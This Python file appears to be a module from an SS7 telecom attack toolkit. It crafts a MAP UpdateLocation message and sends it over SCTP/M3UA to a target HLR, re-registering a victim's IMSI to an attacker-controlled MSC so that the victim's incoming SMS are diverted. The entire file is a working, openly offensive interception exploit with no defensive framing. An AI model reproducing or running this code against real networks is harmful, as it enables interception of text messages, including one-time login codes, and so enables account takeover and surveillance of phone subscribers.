#!/usr/bin/env python
"""
UpdateLocation (UL) Attack Module
SMS Interception by redirecting subscriber to attacker's MSC.
"""
import sys
import os
from scapy.all import *

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import UpdateLocation

def ul_main():
    print("\n" + "=" * 50)
    print(" UpdateLocation (UL) Attack")
    print(" SMS Interception via MSC Redirection")
    print("=" * 50 + "\n")
    
    print("\033[33m[!] WARNING: This attack redirects SMS to your MSC!\033[0m")
    print("\033[33m[!] Target will not receive incoming SMS while active.\033[0m\n")

    # Connection Configuration
    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target HLR IP", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    
    # SS7 Configuration
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "666"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    # Attack Parameters
    print("\n[3] Attack Parameters")
    print("-" * 30)
    target_imsi = get_input("Target IMSI", "286011234567890", validator=validate_imsi)
    attacker_msc = get_input("Your MSC Number (GT)", "44666666666")
    attacker_vlr = get_input("Your VLR Number (GT)", "44666666667")
    
    print("\n" + "=" * 50)
    print(" Building MAP UpdateLocation Message")
    print("=" * 50)
    
    # Create MAP message
    ul = UpdateLocation(target_imsi, attacker_msc, attacker_vlr)
    tcap_data = ul.to_tcap_begin()
    
    print(f"[+] Target IMSI: {target_imsi}")
    print(f"[+] Attacker MSC: {attacker_msc}")
    print(f"[+] Attacker VLR: {attacker_vlr}")
    print(f"[+] MAP Operation: UpdateLocation (OpCode: 2)")
    print(f"[+] TCAP Size: {len(tcap_data)} bytes")
    
    # Show payload
    print("\n[+] MAP Payload (Hex):")
    for i in range(0, min(len(tcap_data), 48), 16):
        hex_part = ' '.join(f'{b:02x}' for b in tcap_data[i:i+16])
        print(f"    {hex_part}")
    
    print(f"\n[+] Sending to HLR at {remote_ip}:{remote_port}...")
    
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=5, verbose=0)
        
        if ans and ans.haslayer(SCTPChunkInitAck):
            print("[+] SCTP Established!")
            print("[+] Sending UpdateLocation...")
            
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            
            data_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            
            map_ans = sr1(data_pkt, timeout=5, verbose=0)
            
            if map_ans:
                print("\n[+] Response received!")
                if map_ans.haslayer(Raw):
                    print("[+] HLR accepted the update!")
                    print("[+] Target SMS is now routed to your MSC.")
            else:
                print("[-] No response or empty response.")
        else:
             print("[-] Connection failed: No SCTP INIT ACK received.")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    
    input("\nPress Enter to return...")



if __name__ == "__main__":
    ul_main()
